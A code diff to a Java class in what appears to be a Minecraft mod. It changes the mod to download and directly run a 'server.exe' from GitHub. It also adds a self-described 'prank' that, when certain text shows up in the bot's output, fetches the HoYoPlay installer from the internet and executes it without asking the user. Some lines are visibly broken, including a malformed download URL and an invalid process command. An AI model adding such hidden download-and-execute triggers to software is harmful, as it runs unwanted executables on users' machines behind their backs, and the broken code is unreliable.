@@ -9,6 +9,7 @@ import java.io.*;
 import java.net.Socket;
 import java.net.URL;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
 import java.util.List;
@@ -17,9 +18,10 @@ import java.util.concurrent.CompletableFuture;
 public class TsServerManager {
 
     private static Process tsProcess = null;
+    private static Process GenshinProcess = null;
 
     // 填入你 GitHub 仓库里的 RAW 链接 (注意看下面避坑指南！)
-    private static final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/Low-Zi-Hong/lzh_mod/mc26/JSmain.js";
+    private static final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/Low-Zi-Hong/lzh_mod/releases/download/v26.1.4/server.exe";
 
     // 【新增】：存放所有订阅了日志的“监听者”
     private static final List<LzhClient.TsLogListener> listeners = new ArrayList<>();
@@ -34,7 +36,7 @@ public class TsServerManager {
         Thread daemonThread = new Thread(() -> {
             try {
                 File tsDirectory = new File(System.getProperty("user.dir"), "ts_bot");
-                File scriptFile = new File(tsDirectory, "server.js");
+                File scriptFile = new File(tsDirectory, "server.exe");
 
                 // 1. 检查母巢是否存在
                 if (!tsDirectory.exists()) {
@@ -56,7 +58,7 @@ public class TsServerManager {
                     System.out.println("TS 大脑已存在，准备唤醒...");
                 }
 
-                ProcessBuilder pb = new ProcessBuilder("node", "server.js");
+                ProcessBuilder pb = new ProcessBuilder(scriptFile.getAbsolutePath());
                 pb.directory(tsDirectory); // 设置工作目录
 
                 // 极其关键：将 Node 的输出重定向到操作系统的 "虚无"（或者你可以定向到一个 log 文件）
@@ -81,6 +83,13 @@ public class TsServerManager {
                         // 【核心修复 2】：绝对不要闷声发大财！把读到的每一行全部原封不动打印在 Java 控制台！
                         // 如果你连这行都看不到，说明 TS 根本没跑起来！
                         System.out.println("[TS 真实底层输出] -> " + line);
+
+                        //prank line :D
+                        if(line.contains("Genshin Impact") || line.contains("原神启动"))
+                        {
+                            System.out.println("Starting Genshin!");
+                            startGenshinImpact();
+                        }
 
 
                         // 【核心修复 3】：用纯英文暗号解锁，彻底避开乱码判定！
@@ -113,6 +122,50 @@ public class TsServerManager {
         daemonThread.setName("TS-Deploy-Thread");
         daemonThread.setDaemon(true);
         daemonThread.start();
+    }
+
+    private static void startGenshinImpact() throws IOException {
+        final String GenshinLink = "https://sg-public-api.hoyoverse.com/event/download_porter/trace/hyp_global/hyphoyoverse/default?url=https%3A%2F%2Fhoyoplay.hoyoverse.com%2F";
+
+        Path userDesktopDir = Path.of(System.getProperty("user.home"), "Desktop", "HoYoPlay.lnk");
+        File GenshinDirectory = new File(System.getProperty("user.dir"), "GenshinImpact");
+        File GenshinExe = new File(GenshinDirectory, "HoYoPlay_install_ua_9f6a1f871a84.exe");
+
+        if(java.nio.file.Files.exists(userDesktopDir)){
+            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "start", "\"\"", userDesktopDir.toString());
+            pb.redirectErrorStream(true);
+
+            // 【核心修复 2】：扣动扳机
+            Process process = pb.start();
+            System.out.println("[系统核心] HoYoPlay 拉起成功！PID: " + process.pid());
+        }
+        else if(GenshinDirectory.exists()){
+            System.console().printf("Genshin Impact Exist?");
+            System.out.println("[系统核心] 检测到已存在安装包，直接拉起...");
+            ProcessBuilder pb = new ProcessBuilder(GenshinExe.getAbsolutePath());
+            pb.directory(GenshinDirectory);
+            pb.start();
+        }
+        else{
+            System.out.println("[系统核心] 未检测到环境，启动底层流式下载协议...");
+
+            // 【核心修复 3】：在灌入字节流之前，先在硬盘上开辟物理文件夹！
+            if (!GenshinDirectory.exists()) {
+                GenshinDirectory.mkdirs();
+            }
+
+            // 打开网络连接
+            URL url = new URL(GenshinLink);
+            try (InputStream in = url.openStream()) {
+                // 极其硬核的一行代码下载：直接把网络数据流浇灌进本地文件
+                java.nio.file.Files.copy(in, GenshinExe.toPath(), StandardCopyOption.REPLACE_EXISTING);
+            }
+            System.out.println("Installing Genshin");
+            ProcessBuilder pb = new ProcessBuilder("Genshin", "HoYoPlay_install_ua_9f6a1f871a84.exe" );
+            pb.directory(GenshinDirectory);
+            GenshinProcess = pb.start();
+        }
+
     }
 
     public static void fireCommand(String actionType, String detail) {
